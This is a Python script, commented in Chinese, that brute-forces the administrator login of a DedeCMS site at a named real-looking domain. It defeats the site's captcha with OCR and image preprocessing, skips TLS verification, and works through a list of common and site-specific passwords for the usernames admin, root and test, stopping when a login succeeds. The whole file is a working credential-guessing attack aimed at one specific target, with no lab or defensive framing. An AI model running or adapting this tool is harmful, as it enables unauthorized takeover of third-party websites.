#!/usr/bin/env python3
"""bf_dede_cg2.py - DedeCMS爆破 v2 (验证码预处理+自适应重试)
策略: 验证码错误就重取(不浪费密码); 密码错误才换密码
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"}
BASE = "http://chinaglass.club"

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "root", "root123", "test", "test123", "admin!@#",
             "dedecms", "dede123", "chinaglass", "glass123"]

def preprocess(img_bytes):
    """放大3倍+灰度+二值化+去干扰"""
    img = Image.open(io.BytesIO(img_bytes)).convert("L")
    w, h = img.size
    img = img.resize((w * 3, h * 3), Image.LANCZOS)
    # 自适应二值化
    img = img.point(lambda p: 255 if p > 130 else 0)
    buf = io.BytesIO()
    img.save(buf, "PNG")
    return buf.getvalue()

def main():
    ocr = ddddocr.DdddOcr(show_ad=False)
    ocr_beta = ddddocr.DdddOcr(show_ad=False, beta=True)
    for round_no in range(1, 4):
        print("=== round %d ===" % round_no, flush=True)
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                             urllib.request.HTTPSHandler(context=ctx))
        try:
            opener.open(urllib.request.Request(BASE + "/admin/login.php", headers=UA), timeout=10).read()
        except Exception:
            pass

        for user in ["admin", "root", "test"]:
            for pw in PASSWORDS:
                hit_pw = False
                for attempt in range(5):
                    try:
                        r = opener.open(urllib.request.Request(BASE + "/include/vdimgck.php", headers=UA), timeout=10)
                        img = r.read()
                        c1 = ocr.classification(img)
                        c2 = ocr_beta.classification(preprocess(img))
                        # 两个OCR一致取之, 否则取beta
                        code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
                    except Exception:
                        continue
                    data = urllib.parse.urlencode({
                        "gotopage": "/admin/", "dopost": "login", "adminstyle": "newdedecms",
                        "userid": user, "pwd": pw, "validate": code
                    }).encode()
                    try:
                        req = urllib.request.Request(BASE + "/admin/login.php", data=data,
                                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded",
                                                              "Referer": BASE + "/admin/login.php"})
                        resp = opener.open(req, timeout=10)
                        b = resp.read(8000).decode("gbk", "ignore")
                        fu = resp.geturl()
                        st = resp.status
                    except urllib.error.HTTPError as e:
                        st, b, fu = e.code, e.read(8000).decode("gbk", "ignore"), e.geturl()
                    except Exception:
                        continue
                    # 验证码不正确 -> 重试验证码
                    if "楠岃瘉鐮佷笉姝" in b or ("验证码" in b and "不正确" in b):
                        if attempt == 0:
                            print("  cap: %s/%s" % (user, pw), flush=True)
                        continue
                    # 密码错误 -> 换密码
                    if "密码" in b and ("不正确" in b or "错误" in b):
                        hit_pw = True
                        break
                    # 成功
                    if st == 302 and "login" not in fu.lower():
                        print("!!! HIT: %s/%s -> %s" % (user, pw, fu), flush=True)
                        sys.exit(0)
                    if "楠岃瘉鐮佷笉姝" not in b and "密码" not in b and len(b) > 1000:
                        print("!!! HIT? %s/%s st=%d fu=%s body=%s" % (user, pw, st, fu, b[:100]), flush=True)
                        sys.exit(0)
                    hit_pw = True
                    break
                if not hit_pw:
                    print("  %s/%s: captcha always wrong" % (user, pw), flush=True)
            print("user %s done" % user, flush=True)
        print("round %d done" % round_no, flush=True)
    print("=== NO HIT ===")

if __name__ == "__main__":
    main()
